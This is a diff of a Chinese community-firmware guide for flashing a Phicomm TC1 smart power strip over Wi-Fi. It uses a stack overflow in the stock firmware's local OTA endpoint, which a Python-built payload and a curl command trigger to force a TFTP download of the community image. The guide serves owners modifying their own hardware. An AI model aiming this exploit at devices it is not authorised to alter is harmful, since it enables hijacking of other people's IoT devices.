@@ -1,46 +1,21 @@
 <!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="原厂配网服务触发 TFTP OTA，无需拆机"><title>免拆刷机 · PHICOMM COMMUNITY</title><link rel="stylesheet" href="../style.css"><script src="../theme.js"></script></head><body><a class="skip" href="#main">跳到主要内容</a><header class="site-header"><div class="wrap"><a class="brand" href=".././"><span class="mark" aria-hidden="true">斐</span><span class="word"><b>PHICOMM COMMUNITY</b><span>社区固件</span></span></a><nav class="site-nav" aria-label="主导航"><a href="../#devices">设备</a><a href="../#features">功能</a><a href="../#iotcloud">IotCloud</a><a href="../#demos">在线演示</a><a href="../#docs">文档</a><a href="../#releases">下载</a></nav><div class="prefs"><label class="sr" for="themePick">主题</label><select id="themePick"><option value="system">跟随系统</option><option value="light">浅色</option><option value="dark">深色</option></select></div></div></header><div class="guide-layout"><nav class="guide-nav" aria-label="文档导航"><p class="guide-group">开始使用</p><a href="quick-start.html">快速开始</a><a href="flash-prep.html">刷机前准备</a><a href="firmware-update.html">固件更新</a><a href="iotcloud-connect.html">接入 IotCloud</a><a href="mqtt-link.html">MQTT 与联动</a><a href="faq.html">故障排查</a><p class="guide-group">TC1 智能排插</p><a href="tc1-guide.html">功能与操作</a><a href="tc1-flash.html">刷机</a><a href="tc1-no-disassembly.html" aria-current="page">免拆刷机</a><p class="guide-group">M1 空气检测仪</p><a href="m1-guide.html">功能与操作</a><a href="a1-m1-flash.html">刷机：J-Link / Bootloader</a><p class="guide-group">A1 空气净化器</p><a href="a1-guide.html">功能与操作</a><a href="a1-m1-flash.html">刷机：J-Link / Bootloader</a><p class="guide-group">开发与维护</p><a href="iotcloud-deploy.html">IotCloud 部署</a><a href="build-deps.html">构建依赖</a><a href="sources.html">资源来源</a><a href="release-log.html">Release Log</a></nav><main class="guide-main" id="main"><p class="guide-language" aria-label="Language">简体中文 · <a href="en/tc1-no-disassembly.html" lang="en">English</a></p><article class="prose"><h1 id="tc1-免拆刷机">TC1 免拆刷机</h1>
 <p><strong>适用于 TC1 A1 硬件（EMW3031 / MK3031）、原厂版本 1.0.0.26。</strong> 其他原厂版本、TC1 A2 与 A1 空气净化器不适用。</p>
-<p>不拆壳、不接串口或 SWD：通过 Wi-Fi 让设备从本地 TFTP 服务器下载社区镜像并完成切换，全过程不需要原厂云服务。先阅读<a href="flash-prep.html">刷机前准备</a>与<a href="firmware-update.html">固件更新</a>。</p>
-<p>刷写会擦除非活动应用槽并重启设备；原厂保留槽<strong>不构成自动回退保证</strong>。刷写期间保持供电，排插上不要连接负载。</p>
-<h2 id="需要准备什么">需要准备什么</h2>
-<table>
-<thead>
-<tr>
-<th>角色</th>
-<th>需要做到什么</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>配网客户端</td>
-<td>连接 TC1 的开放配网热点，获得 <code>10.10.10.x/24</code>，能访问 <code>10.10.10.1:8000</code></td>
-</tr>
-<tr>
-<td>OTA 热点与文件服务器</td>
-<td>提供 2.4 GHz 开放热点 <code>PHICOMM_OTA_AP</code>；设备能通过该热点访问 <code>10.0.0.2/8</code> 上的 TFTP，下载 <code>mico_ota.bin</code></td>
-</tr>
-</tbody>
-</table>
-<p>操作系统和设备型号不限。可以用一台电脑或手机接 TC1 热点，另一台电脑、便携路由器或无线 AP 承载 OTA 网络；TFTP 既可以跑在 AP 本机，也可以跑在 AP 桥接的有线网络中的电脑上。</p>
-<h3 id="推荐方案一台有线无线网卡的电脑和一台路由器">推荐方案：一台有线＋无线网卡的电脑和一台路由器</h3>
-<p>准备一台同时有有线网卡、无线网卡的电脑，以及一台无线路由器。电脑的有线网卡提供固件，无线网卡连接 TC1 配网热点并发送触发请求；路由器负责提供 OTA 热点。<strong>能实现同等连接关系的拓扑也可以使用。</strong></p>
-<pre><code class="language-text">电脑有线网卡（10.0.0.2/8，TFTP 服务）──网线──路由器 LAN 口
-电脑无线网卡 ──Wi-Fi── TC1 配网热点 Phicomm_TC1_XXXX
-TC1 进入工厂 OTA 模式后 ──Wi-Fi── 路由器 PHICOMM_OTA_AP
-</code></pre>
-<p>按以下顺序操作，先准备好接收设备的 OTA 网络，再触发刷机：</p>
-<ol>
-<li>按下文「生成升级文件」准备好 <code>mico_ota.bin</code>。将路由器的 <strong>2.4 GHz Wi-Fi</strong> 名称设为 <strong><code>PHICOMM_OTA_AP</code></strong>，<strong>无密码</strong>，关闭客户端隔离；该 Wi-Fi 必须与 LAN 口桥接互通。</li>
-<li>电脑有线网卡用网线连接路由器的 <strong>LAN 口</strong>，手动设为 <strong><code>10.0.0.2</code> / <code>255.0.0.0</code>（/8）</strong>，无需填写网关和 DNS。确认路由器及其他设备没有占用 <code>10.0.0.2</code>。</li>
-<li>在电脑上启动 <strong>tftpd 等 TFTP 服务</strong>，服务目录放入 <code>mico_ota.bin</code>，监听有线网卡的 <code>10.0.0.2</code>；按下文「建立 OTA 热点与 TFTP」放行防火墙并检查下载。保持服务和日志窗口开启。</li>
-<li>按下文「进入配网模式」复位 <strong>TC1 A1 硬件版排插</strong>，看到 <code>Phicomm_TC1_XXXX</code> 后，用电脑的<strong>无线网卡</strong>连接它，确认获得 <code>10.10.10.x/24</code>，并只读核对原厂版本。有线连接与 TFTP 服务保持运行。</li>
-<li>按下文「触发刷机」运行 Python 脚本生成栈溢出 payload，再用紧随其后的 <code>curl</code> 命令发送给 TC1。电脑通过无线网卡访问 <code>10.10.10.1</code>，通过有线网卡提供 <code>10.0.0.2</code> 上的文件，两块网卡无需共享网络或互相桥接。</li>
-<li>设备进入工厂 OTA 模式后，会离开配网热点，自动连接路由器的 <code>PHICOMM_OTA_AP</code>。此时电脑无线连接断开是预期现象；观察电脑上的 <strong>TFTP 日志</strong>，应看到设备请求并下载 <code>mico_ota.bin</code>。等待传输、校验和重启完成，再按下文确认新固件热点与本地网页。</li>
-</ol>
-<p>这里的传输方向是<strong>电脑向 TC1 发送文件、TC1 从电脑下载固件</strong>；TFTP 工具通常显示读取请求（RRQ）或发送文件记录。无需让电脑无线网卡切换到路由器热点。</p>
-<h3 id="其他设备组合">其他设备组合</h3>
-<p>也可以用两台独立设备分别承担配网客户端和 OTA 网络。若用单块无线网卡同时连接 TC1 热点并提供 OTA 热点，该网卡及驱动必须支持 Wi-Fi 客户端与热点并行运行；先建立 OTA 热点，再连接 TC1 配网热点。</p>
-<h2 id="生成升级文件">生成升级文件</h2>
+<p>通过 Wi-Fi 安装社区固件，无需拆壳、焊接、串口或 SWD，也不依赖原厂云服务。</p>
+<h2 id="原理">原理</h2>
+<p>原厂固件在配网模式下提供一个本地配置服务，其中的 OTA 接口存在栈溢出漏洞。电脑向这个接口发送特制请求（payload），就能让设备跳转到固件自带的<strong>工厂 OTA 升级流程</strong>。</p>
+<p>进入这个流程后，TC1 会主动连接名为 <code>PHICOMM_OTA_AP</code> 的开放 Wi-Fi，从 <code>10.0.0.2</code> 上的 TFTP 服务下载 <code>mico_ota.bin</code>。下载完成后，设备校验文件、切换固件并重启，启动社区固件。</p>
+<p>整个过程分为两段：<strong>先用电脑连接 TC1 配网热点发送触发请求，再由 TC1 连接路由器热点下载固件。</strong> 因此，需要提前准备好 OTA 热点和文件服务；两段连接不需要共用一块网卡。</p>
+<h2 id="刷机准备">刷机准备</h2>
+<h3 id="设备与工具">设备与工具</h3>
+<ul>
+<li>一台 <strong>TC1 A1 硬件版排插</strong>，原厂版本为 <strong>1.0.0.26</strong>。</li>
+<li>一台同时有<strong>有线网卡和无线网卡</strong>的电脑，以及一台支持 <strong>2.4 GHz 开放 Wi-Fi</strong> 的路由器。</li>
+<li>一根网线，电脑上安装 Python 3、<code>curl</code> 和 <strong>tftpd 等 TFTP 服务软件</strong>。也可使用本页提供的 Python TFTP 服务。</li>
+<li>对应设备的社区应用槽镜像 <code>tc1_community.image.bin</code>。</li>
+</ul>
+<p>也可以使用其他等效拓扑。关键是同时具备两条连接：一个客户端能连接 TC1 配网热点发送请求，TC1 随后能通过 OTA 热点访问文件服务器。</p>
+<p>刷机前了解<a href="flash-prep.html">供电与接线要求</a>以及<a href="firmware-update.html">固件包的选择</a>。刷写会擦除非活动应用槽并重启设备；原厂保留槽<strong>不构成自动回退保证</strong>。</p>
+<h3 id="准备升级文件">准备升级文件</h3>
 <p>升级文件是原始 <strong>MRVL 应用槽镜像 + 该镜像的 16 字节二进制 MD5</strong>，不是 32 字符文本。社区应用槽镜像为 649328 字节，按下面步骤生成 649344 字节的 <code>mico_ota.bin</code>：</p>
 <pre><code class="language-sh">python3 - &lt;&lt;'PY'
 import hashlib
@@ -52,26 +27,33 @@ print(len(image), hashlib.md5(image).hexdigest())
 PY
 </code></pre>
 <p>镜像 MD5 应为 <code>137bbe25d40f0a45b2b3129f035ea4c3</code>。不要将整片备份、完整 <code>.all.bin</code> 或带 <code>PHOTA001</code> 包头的网页升级包作为输入；脚本只检查 MRVL 标记、大小和 MD5，不负责证明镜像适合该硬件。</p>
-<h2 id="进入配网模式">进入配网模式</h2>
-<p>两种方法任选其一。成功标志相同：LED 慢闪，广播开放热点 <code>Phicomm_TC1_XXXX</code>（<code>XXXX</code> 为 MAC 后四位），设备地址 <code>10.10.10.1/24</code>，并在 <code>:8000</code> 监听配置服务。</p>
-<ul>
-<li><strong>方法一：</strong> 断电重新上电，在上电 <strong>3 秒内双击配网键</strong>。LED 转为约 500 ms 慢闪，随后出现开放热点。</li>
-<li><strong>方法二：</strong> 长按配网键，等 LED 转为快闪后保持一段时间再松开，随后快速短按配网键两次；出现开放热点即进入配网模式。不同原厂版本对快闪的定义可能不同，以热点出现为准。</li>
-</ul>
-<p>看不到热点时，先断电重试方法一；仍不行时重新核对设备硬件版本与原厂版本，不要反复快速操作。</p>
-<p>配网客户端连接该热点后，先只读确认版本：</p>
-<pre><code class="language-sh">curl -s -m 5 http://10.10.10.1:8000/read-domain
-</code></pre>
-<p><code>VERSION</code> 应为 <code>1.0.0.26</code>，<code>COMPILE_TIME</code> 为 <code>Apr 13 2018 10:09:06</code>。版本不符时不要继续。</p>
-<h2 id="建立-ota-热点与-tftp">建立 OTA 热点与 TFTP</h2>
+<h2 id="刷机方法">刷机方法</h2>
+<h3 id="前置步骤">前置步骤</h3>
 <ol>
-<li>创建 <strong>2.4 GHz</strong> 热点，名称精确为 <strong><code>PHICOMM_OTA_AP</code></strong>，开放、无密码，不启用客户端隔离。</li>
-<li>TFTP 服务器的 OTA 侧地址设为 <strong><code>10.0.0.2</code></strong>、掩码 <strong><code>255.0.0.0</code>（/8）</strong>。服务器在 AP 外部时，把热点桥接到服务器所在二层网络。</li>
-<li>在服务器上提供名为 <strong><code>mico_ota.bin</code></strong> 的文件，允许 TFTP 二进制（octet）读取，512 字节块，不使用选项协商。</li>
-<li>放行设备到服务器的 TFTP 请求和传输会话：首包目的端口为 UDP 69，后续数据传输使用服务器另开的端口，只放行 69 可能传不完文件。</li>
-<li>先用另一台客户端完整下载一次并核对大小与指纹；主机回环下载只能检查文件服务，不能证明无线侧与防火墙已通。</li>
+<li>将 <code>mico_ota.bin</code> 放入电脑的 TFTP 服务目录，准备好终端和 TFTP 日志窗口。</li>
+<li>给 TC1 保持稳定供电，排插上不要连接负载。</li>
+<li>完成 OTA 热点和 TFTP 服务的设置、检查后，再让 TC1 进入配网模式并发送触发请求。刷写期间保持电脑有线连接、路由器和 TFTP 服务运行。</li>
 </ol>
-<p>没有现成 TFTP 服务时，可用下面的只读 Python 服务（只提供该文件，拒绝写入）：</p>
+<h3 id="1-建立-ota-热点与-tftp">1. 建立 OTA 热点与 TFTP</h3>
+<h4 id="推荐方法电脑双网卡路由器">推荐方法：电脑双网卡＋路由器</h4>
+<p>电脑通过有线网卡提供固件，通过无线网卡连接 TC1 配网热点；路由器提供设备下载固件所需的 OTA 热点。</p>
+<pre><code class="language-text">电脑有线网卡（10.0.0.2/8，TFTP 服务）──网线──路由器 LAN 口
+电脑无线网卡 ──Wi-Fi── TC1 配网热点 Phicomm_TC1_XXXX
+TC1 进入工厂 OTA 模式后 ──Wi-Fi── 路由器 PHICOMM_OTA_AP
+</code></pre>
+<ol>
+<li>设置路由器的 <strong>2.4 GHz Wi-Fi</strong>：名称精确为 <strong><code>PHICOMM_OTA_AP</code></strong>，<strong>无密码</strong>，关闭客户端隔离。该 Wi-Fi 应与 LAN 口桥接互通。</li>
+<li>用网线将电脑有线网卡连接到路由器的 <strong>LAN 口</strong>。将有线网卡地址手动设为 <strong><code>10.0.0.2</code></strong>，掩码为 <strong><code>255.0.0.0</code>（/8）</strong>，无需填写网关和 DNS。确认路由器及其他设备没有占用 <code>10.0.0.2</code>。</li>
+<li>启动电脑上的 <strong>tftpd 等 TFTP 服务</strong>，服务目录中放入 <code>mico_ota.bin</code>，监听有线网卡的 <code>10.0.0.2</code>。允许二进制（octet）读取，使用 512 字节块，不使用选项协商。</li>
+<li>在防火墙中允许设备访问 TFTP：初始请求使用 <strong>UDP 69</strong>，后续传输使用服务器另开的端口，需要一并放行。Linux/macOS 监听 69 端口通常需要相应权限；Windows 需允许 OTA 网卡上的 UDP 通信。</li>
+<li>用另一台连接该路由器 Wi-Fi 的客户端完整下载一次 <code>mico_ota.bin</code>，核对文件大小和 MD5。电脑本机下载只能检查文件服务，无法证明无线侧已通。检查完成后，保持 TFTP 服务和日志窗口开启。</li>
+</ol>
+<p>电脑两块网卡<strong>无需共享网络或互相桥接</strong>。有线网卡服务 <code>10.0.0.2</code>，无线网卡访问 TC1 的 <code>10.10.10.1</code>；连接 TC1 后，不需要再让电脑无线网卡切换到路由器热点。</p>
+<h4 id="其他等效拓扑">其他等效拓扑</h4>
+<p>操作系统和设备型号不限，也可以由一台电脑或手机连接 TC1 配网热点，另一台电脑、便携路由器或无线 AP 提供 OTA 网络。TFTP 可以运行在 AP 本机，或运行在与热点桥接互通的有线电脑上。</p>
+<p>无论使用哪种设备组合，都要满足：<strong>开放的 2.4 GHz 热点 <code>PHICOMM_OTA_AP</code>，以及能通过该热点访问的 <code>10.0.0.2/8</code> TFTP 服务</strong>，文件名为 <code>mico_ota.bin</code>。若用单块无线网卡同时连接 TC1 热点并提供 OTA 热点，网卡及驱动必须支持客户端与热点并行运行。</p>
+<h4 id="可选使用-python-提供-tftp-服务">可选：使用 Python 提供 TFTP 服务</h4>
+<p>没有现成 TFTP 软件时，可用下面的只读 Python 服务（只提供该文件，拒绝写入）：</p>
 <pre><code class="language-sh">python3 - &lt;&lt;'PY'
 import socket, struct
 data = open('mico_ota.bin', 'rb').read()
@@ -101,8 +83,19 @@ print('done')
 PY
 </code></pre>
 <p>Linux/macOS 监听 69 端口通常需要相应权限；Windows 需按防火墙提示放行 OTA 网卡上的 UDP。</p>
-<h2 id="触发刷机">触发刷机</h2>
-<p>确认 OTA 热点和 TFTP 服务就绪后，从仍连接 TC1 配网热点的客户端生成社区提供的触发文件并发送一次：</p>
+<h3 id="2-让-tc1-进入配网模式">2. 让 TC1 进入配网模式</h3>
+<p>两种方法任选其一。成功标志相同：LED 慢闪，广播开放热点 <code>Phicomm_TC1_XXXX</code>（<code>XXXX</code> 为 MAC 后四位），设备地址 <code>10.10.10.1/24</code>，并在 <code>:8000</code> 监听配置服务。</p>
+<ul>
+<li><strong>方法一：</strong> 断电重新上电，在上电 <strong>3 秒内双击配网键</strong>。LED 转为约 500 ms 慢闪，随后出现开放热点。</li>
+<li><strong>方法二：</strong> 长按配网键，等 LED 转为快闪后保持一段时间再松开，随后快速短按配网键两次；出现开放热点即进入配网模式。不同原厂版本对快闪的定义可能不同，以热点出现为准。</li>
+</ul>
+<p>看不到热点时，先断电重试方法一；仍不行时重新核对设备硬件版本与原厂版本，不要反复快速操作。</p>
+<p>用电脑的无线网卡连接该热点，确认获得 <code>10.10.10.x/24</code> 地址。有线网卡和 TFTP 服务保持运行。然后在电脑终端执行只读查询，确认原厂版本：</p>
+<pre><code class="language-sh">curl -s -m 5 http://10.10.10.1:8000/read-domain
+</code></pre>
+<p><code>VERSION</code> 应为 <code>1.0.0.26</code>，<code>COMPILE_TIME</code> 为 <code>Apr 13 2018 10:09:06</code>。版本不符时不要继续。</p>
+<h3 id="3-发送触发请求">3. 发送触发请求</h3>
+<p>保持电脑无线网卡连接 TC1 配网热点，在电脑终端执行以下命令：Python 先生成栈溢出触发文件，<code>curl</code> 再将它发送给设备。只发送一次，随后观察设备与 TFTP 日志。</p>
 <pre><code class="language-sh">python3 - &lt;&lt;'PY'
 body = b'A' * 392 + (0x1F073D9F).to_bytes(4, 'little') + b'\0'
 open('tftp-trigger.bin', 'wb').write(body)
@@ -113,13 +106,14 @@ curl --max-time 30 --header 'Content-Type: application/json' \
   http://10.10.10.1:8000/OTA
 </code></pre>
 <p>返回 <code>OTA AAAA...</code> 只表示请求已被接收，<strong>不代表刷写成功</strong>。连接中断或返回未确认时，先观察设备状态，不要立即重复触发。</p>
-<h2 id="观察下载与首启">观察下载与首启</h2>
-<p>设备离开配网状态后会加入 <code>PHICOMM_OTA_AP</code>，使用地址 <code>10.&lt;MAC 后三字节逐字节转十进制&gt;</code>、掩码 <code>/8</code>；每台设备不同，不要照抄示例。</p>
-<p>典型顺序：加入 OTA 热点 → 擦除非活动应用槽 → 从 <code>10.0.0.2</code> 下载 <code>mico_ota.bin</code> → 校验 MD5 → 切换应用槽并重启。TFTP 服务应能看到完整下载记录。</p>
-<p>成功首启后会出现开放热点 <strong><code>TC1_A1-AP-&lt;MAC 后六位大写&gt;</code></strong>，设备地址 <strong><code>192.168.0.1</code></strong>。连接该热点后打开设备本地网页继续配网。</p>
-<h2 id="验收与恢复">验收与恢复</h2>
-<p>分别记录四项：原厂识别信息、TFTP 是否完整下载、新固件热点、网页是否可访问。不要只以 HTTP 200、设备掉线或一次 TFTP 传输宣告完成。</p>
-<p>确认新固件可用后，关闭临时 OTA 热点与 TFTP 服务，恢复为此次操作调整的网卡地址和防火墙配置。使用 OpenWrt / ImmortalWrt 设备时，按上面的目标自行配置临时接口与 dnsmasq TFTP，结束后删除这些配置并恢复原网络。</p>
+<h3 id="4-等待下载与首次启动">4. 等待下载与首次启动</h3>
+<p>设备进入工厂 OTA 模式后，会离开配网热点并自动加入路由器的 <code>PHICOMM_OTA_AP</code>。此时电脑无线连接断开是预期现象，有线连接和 TFTP 服务继续运行。</p>
+<p>观察电脑上的 <strong>TFTP 日志</strong>，应看到设备请求并下载 <code>mico_ota.bin</code>。传输方向是<strong>电脑向 TC1 发送文件、TC1 从电脑下载固件</strong>，软件通常显示读取请求（RRQ）或发送文件记录。</p>
+<p>TC1 在 OTA 网络中使用 <code>10.&lt;MAC 后三字节逐字节转十进制&gt;</code>、掩码 <code>/8</code>；每台设备地址不同。典型过程为：加入 OTA 热点 → 擦除非活动应用槽 → 下载固件 → 校验 MD5 → 切换应用槽并重启。保持供电，等待整个过程完成。</p>
+<p>成功首启后会出现开放热点 <strong><code>TC1_A1-AP-&lt;MAC 后六位大写&gt;</code></strong>。用电脑或手机连接该热点，在浏览器打开 <strong><code>http://192.168.0.1</code></strong>，进入社区固件本地网页继续配网。</p>
+<h3 id="5-确认完成并恢复网络">5. 确认完成并恢复网络</h3>
+<p>分别确认原厂识别信息、TFTP 完整下载记录、新固件热点和本地网页可访问。HTTP 200、设备掉线或一次 TFTP 传输都不能单独作为刷机成功的依据。</p>
+<p>确认新固件可用后，关闭临时 OTA 热点与 TFTP 服务，恢复本次调整的网卡地址和防火墙配置。使用 OpenWrt / ImmortalWrt 搭建临时接口与 dnsmasq TFTP 的，删除本次添加的临时配置，恢复原网络。</p>
 <h2 id="常见问题">常见问题</h2>
 <table>
 <thead>
